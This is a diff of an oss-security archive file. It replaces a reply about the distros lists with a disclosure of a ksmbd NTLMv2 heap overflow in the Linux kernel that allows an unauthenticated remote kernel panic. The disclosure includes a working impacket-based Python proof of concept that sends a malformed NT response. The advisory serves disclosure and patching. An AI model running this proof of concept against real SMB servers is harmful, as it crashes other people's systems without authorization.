@@ -1,34 +1,66 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/04/15/2
-Message-ID: <20230415123118.GA10525@openwall.com>
-Date: Sat, 15 Apr 2023 14:31:18 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/01/04/1
+Message-ID: <CAGakKvz79Ey501w4LwNsMv4zj6LyYdagNyXWOrEt5Kus9xUmuQ@mail.gmail.com>
+Date: Wed, 4 Jan 2023 17:35:09 +0100
+From: Hrvoje Mišetić <misetichrvoje@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: ncurses fixes upstream
+Cc: will@...lsroot.io
+Subject: Linux kernel: Unauthenticated remote DOS in ksmbd NTLMv2 authentication
 Content-Type: text/plain; charset=utf-8
 
-On Sat, Apr 15, 2023 at 09:33:24AM +0300, Georgi Guninski wrote:
-> Isn't MicroSoft member of linux distros mailing list [0], which
-> purpose is exactly quietly trading 0days [1]?
-> 
-> Does the OP with m$ email address realize this?
-> 
-> [0] https://oss-security.openwall.org/wiki/mailing-lists/distros
-> [1] https://seclists.org/oss-sec/2019/q3/19
-> Re: linux-distros membership application - Microsoft
+There is a heap overflow bug in ksmbd_decode_ntlmssp_auth_blob in which nt_len
+can be less than CIFS_ENCPWD_SIZE. This results in a negative blen argument
+for ksmbd_auth_ntlmv2, where it calls memcpy using blen on memory allocated
+by kmalloc(blen + CIFS_CRYPTO_KEY_SIZE). Note that CIFS_ENCPWD_SIZE is 16
+and CIFS_CRYPTO_KEY_SIZE is 8. We believe this bug can only result in a
+remote DOS and not privilege escalation nor RCE, as the heap overflow occurs
+when blen is in range (-8, -1]. The resulting overflow will be too large,
+and will lead to a kernel panic. When blen is -8, kmalloc returns
+ZERO_SIZE_PTR which will cause a null dereference, but the kernel will oops
+and will usually continue to function. This bug has existed since 5.15-rc1
+and is still present in the upstream source tree, having just been patched
+in https://github.com/cifsd-team/ksmbd and is awaiting merging - the commit
+ID is 8824b7af409f51f1316e92e9887c2fd48c0b26d6.
 
-The (linux-)distros lists are meant for handling of embargoed issues
-prior to their public disclosure and in cases where such private
-handling is expected to help.  In this case, the issue was already
-semi-public (via the fixes and the NEWS file) and I wouldn't expect
-private handling to help more than public does.  Every distro present on
-(linux-)distros is supposed to also be present on oss-security.  So in
-my opinion Jonathan did the right thing of posting this to oss-security
-right away.
+We have tested this bug on Ubuntu 20.04 HWE and 22.04 (both running on
+5.15.0-56-generic) and can remotely panic the OS immediately. Any attacker
+that can access the ksmbd SMB port can easily cause a kernel panic. Note that
+while the attacker has to know a valid username for the service, it does not
+need to know the password as the bug happens in the challenge-response phase
+of ntlmv2 protocol, making this an unauthenticated attack.
 
-Also, in general, choosing whether to post to linux-distros, to distros,
-or to oss-security shouldn't be related to whether one is a member of
-(linux-)distros or not.  Anyone can report an issue to any of these
-lists as appropriate for the given issue and its current status.
+Below is a POC to trigger the bug.
+------------------------------------------------------------------------------
+#!/usr/bin/python3
+from impacket.smbconnection import SMBConnection
+import functools
+import impacket.ntlm
 
-Alexander
+# using impacket-0.10.0
+
+user = "test"
+pw = "test"
+domain = "localhost"
+address = "127.0.0.1"
+target_ip = "127.0.0.1"
+port = "445"
+
+def post_function(function, postfunction):
+    @functools.wraps(function)
+    def run(*args, **kwargs):
+        resp = function(*args, **kwargs)
+        return postfunction(resp)
+    return run
+
+def post_computeResponseNTLMv2_hook(resp):
+    return ('A' * 10, resp[1], resp[2])
+
+impacket.ntlm.computeResponseNTLMv2 = post_function(
+    impacket.ntlm.computeResponseNTLMv2, post_computeResponseNTLMv2_hook)
+
+smbClient = SMBConnection(address, target_ip, port)
+smbClient.login(user, pw, domain)
+------------------------------------------------------------------------------
+Best,
+Hrvoje Mišetić
+William Liu
